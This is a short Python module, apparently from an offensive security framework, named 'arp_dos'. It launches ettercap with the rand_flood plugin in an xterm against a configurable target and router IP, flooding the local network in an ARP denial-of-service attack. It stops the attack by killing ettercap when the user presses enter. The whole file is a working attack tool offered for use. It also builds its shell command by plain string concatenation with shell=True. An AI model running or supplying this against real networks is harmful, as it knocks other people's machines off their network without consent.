#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)
import sys
from core import colors
import subprocess
from time import sleep
from collections import OrderedDict
import os

# Info about the module
# Module's name (should be same as file's name)
name = "arp_dos"
# Module version
version = "1.0"
# Description
desc = "ARP cache denial of service attack"
# Creator's github
github = "4shadoww"
# Creator's name
createdby = "4shadoww"
# Email
email = "4shadoww0@gmail.com"
# Alert user if root permissions not available (remove variable below if root permissions not needed)
needroot = 1

# List of the variables
variables = OrderedDict((
('target', '192.168.1.2'),
('router', '192.168.1.1'),
('interface', 'eth0'),
))

# Description for variables
vdesc = [
'target ip address',
'router ip address',
'network interface name',
]

# Additional help notes
help_notes = colors.red+"this module will not work without root permissions!"+colors.end

#simple changelog
changelog = "Version 1.0:\nrelease"

def run():
	print(colors.bold + colors.blue + "[*]attack has been started ..." + colors.end)
	command = 'xterm -e ettercap -i '+ variables['interface'] + ' -Tq -P rand_flood ' + '/'+variables['router']+'//' + ' ' + '/'+variables['target']+'//'
	subprocess.Popen(command, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
	line_4 = colors.blue+"for stop attack press [enter]"+colors.end
	fin = input(line_4)
	os.system('killall ettercap')
	print(colors.bold + colors.green + "[*]attack stoped" + colors.end)